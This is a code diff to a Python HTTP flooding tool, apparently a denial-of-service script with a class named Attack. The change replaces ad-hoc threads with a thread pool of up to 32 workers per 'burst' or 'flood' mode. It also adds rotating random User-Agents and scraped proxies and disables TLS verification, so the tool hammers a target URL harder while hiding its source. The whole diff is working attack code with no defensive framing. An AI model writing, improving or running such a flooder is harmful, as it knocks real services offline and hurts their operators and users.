@@ -34,6 +34,12 @@ from colorama import Fore, Style
 colorama.init()
 
 import requests
+import urllib3
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 PINK = "\033[38;5;206m"
 RESET = Style.RESET_ALL
@@ -155,7 +161,8 @@ class Attack:
 
         if self.use_proxy:
             print("   " + DIM + "fetching proxies..." + RESET, end="", flush=True)
-            self.proxies = scrape_proxies()
+            proxies = scrape_proxies()
+            self.proxies = [{"http": p, "https": p} for p in proxies if p]
             if self.proxies:
                 print(f"\r   {PINK}found {len(self.proxies)} proxies :3{RESET}" + " " * 30)
             else:
@@ -164,35 +171,87 @@ class Attack:
 
         start = time.time()
 
-        for i in range(self.num_requests):
-            if not self.running:
-                break
-            try:
+        if self.mode == "soft":
+            workers = 1
+            batch_target = 1
+        elif self.mode == "burst":
+            workers = 16
+            batch_target = 32
+        else:
+            workers = 32
+            batch_target = 64
+
+        retry = Retry(total=1, connect=1, read=1, redirect=1, backoff_factor=0.1, status_forcelist=[])
+        adapter = HTTPAdapter(
+            pool_connections=workers,
+            pool_maxsize=workers,
+            max_retries=retry,
+            pool_block=True,
+        )
+        session = requests.Session()
+        session.mount("https://", adapter)
+        session.mount("http://", adapter)
+        executor = ThreadPoolExecutor(max_workers=workers)
+
+        def send(headers, proxy):
+            session.get(self.url, headers=headers, proxies=proxy, timeout=5, verify=False)
+
+        try:
+            futures = []
+            total = self.num_requests * (1 if self.mode == "burst" else 5)
+            for _ in range(total):
+                if not self.running:
+                    break
                 headers = {"User-Agent": random.choice(USER_AGENTS)}
-                proxy = None
-                if self.use_proxy and self.proxies:
-                    proxy = {"http": random.choice(self.proxies), "https": random.choice(self.proxies)}
+                proxy = random.choice(self.proxies) if (self.use_proxy and self.proxies) else None
 
                 if self.mode == "soft":
-                    requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
-                elif self.mode == "burst":
-                    threading.Thread(target=requests.get, args=(self.url,),
-                        kwargs={"headers": headers, "proxies": proxy, "timeout": 3}, daemon=True).start()
-                elif self.mode == "flood":
-                    for _ in range(5):
-                        threading.Thread(target=requests.get, args=(self.url,),
-                            kwargs={"headers": headers, "proxies": proxy, "timeout": 2}, daemon=True).start()
+                    try:
+                        send(headers, proxy)
+                        with self.lock:
+                            self.sent += 1
+                            show_progress(self.sent, self.num_requests)
+                    except requests.exceptions.RequestException:
+                        with self.lock:
+                            self.errors += 1
+                    except Exception:
+                        with self.lock:
+                            self.errors += 1
+                    continue
 
-                with self.lock:
-                    self.sent += 1
-                    show_progress(self.sent, self.num_requests)
+                futures.append(executor.submit(send, headers, proxy))
+                if len(futures) >= batch_target:
+                    for fut in as_completed(futures):
+                        try:
+                            fut.result()
+                        except requests.exceptions.RequestException:
+                            with self.lock:
+                                self.errors += 1
+                        except Exception:
+                            with self.lock:
+                                self.errors += 1
+                        finally:
+                            with self.lock:
+                                self.sent += 1
+                                show_progress(self.sent, self.num_requests)
+                    futures = []
 
-            except requests.exceptions.RequestException:
-                with self.lock:
-                    self.errors += 1
-            except Exception:
-                with self.lock:
-                    self.errors += 1
+            for fut in as_completed(futures):
+                try:
+                    fut.result()
+                except requests.exceptions.RequestException:
+                    with self.lock:
+                        self.errors += 1
+                except Exception:
+                    with self.lock:
+                        self.errors += 1
+                finally:
+                    with self.lock:
+                        self.sent += 1
+                        show_progress(self.sent, self.num_requests)
+        finally:
+            executor.shutdown(wait=False)
+            session.close()
 
         elapsed = time.time() - start
         print("\n")
